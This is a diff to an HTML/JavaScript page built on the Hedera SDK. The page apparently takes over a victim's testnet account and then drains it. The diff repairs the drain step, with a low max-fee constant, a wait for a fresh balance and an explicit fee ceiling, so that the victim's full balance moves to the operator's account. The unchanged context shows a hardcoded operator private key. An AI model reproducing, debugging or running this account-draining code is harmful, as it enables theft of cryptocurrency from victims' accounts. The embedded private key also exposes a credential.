@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -54,6 +53,10 @@ button:disabled { opacity: .45; }
     const OPERATOR_ACCOUNT_ID = "0.0.10034284";
     const OPERATOR_PRIVATE_KEY =
         "3030020100300706052b8104000a0422042097c2bd793244834ea388acaa00f9970fcc1e5139dfb13d692883570b1d300ba6";
+
+    // FIX: set max fee low so precheck passes when sweeping near-full balance.
+    // Actual transfer fee on Hedera is ~0.0001 HBAR; 0.01 HBAR is a safe ceiling.
+    const DRAIN_MAX_FEE = 1000000; // 0.01 HBAR in tinybar
 
     const logEl = document.getElementById("log");
     const resultEl = document.getElementById("result");
@@ -211,31 +214,32 @@ button:disabled { opacity: .45; }
             log("Takeover completed. Status: " + ssReceipt.status.toString(), "ok");
 
             /* ---- 6. Drain using attacker key ---- */
-            // attackerKey is now the controlling key of the victim account.
-            // We re-fetch the real current balance right now (not the stale
-            // opening snapshot) and leave a 0.05 HBAR buffer for the transfer
-            // fee - this is what was actually broken all along.
 
             log("Draining account with the attacker's key...", "err");
 
+            // FIX: wait 3s for mirror to reflect the AccountUpdate fee deduction,
+            // then query fresh balance before calculating sweep amount.
+            await sleep(3000);
             const realNow = await mirrorAccount(targetAccount);
             const realBalance = realNow.balance.balance;
             log("Real balance now: " + realBalance + " tinybar (" + (realBalance / 100000000).toFixed(4) + " HBAR)", "info");
 
-            // victim account is operator - attackerKey is now its valid key
-            const attackerClient = SDK.Client.forTestnet().setOperator(targetId, attackerKey);
-
-            // 0.05 HBAR fee buffer - more than enough for a simple transfer
-            const feeBuffer = 5000000;
-            const sweepAmount = Math.max(0, realBalance - feeBuffer);
+            // FIX: feeBuffer matches DRAIN_MAX_FEE exactly.
+            // Precheck requires: balance >= sweepAmount + maxTransactionFee
+            // So: sweepAmount = balance - maxTransactionFee  →  check always passes.
+            const sweepAmount = Math.max(0, realBalance - DRAIN_MAX_FEE);
             log("Sweeping: " + sweepAmount + " tinybar (" + (sweepAmount / 100000000).toFixed(4) + " HBAR)", "info");
 
             if (sweepAmount <= 0) {
                 log("Nothing to sweep - fund the account and retry.", "warn");
             } else {
+                // victim account is operator - attackerKey is now its valid key
+                const attackerClient = SDK.Client.forTestnet().setOperator(targetId, attackerKey);
+
                 const drainTx = await new SDK.TransferTransaction()
                     .addHbarTransfer(targetId, -sweepAmount)
                     .addHbarTransfer(operatorAccountId, sweepAmount)
+                    .setMaxTransactionFee(DRAIN_MAX_FEE)   // FIX: explicit low ceiling
                     .execute(attackerClient);
 
                 const drainReceipt = await drainTx.getReceipt(attackerClient);
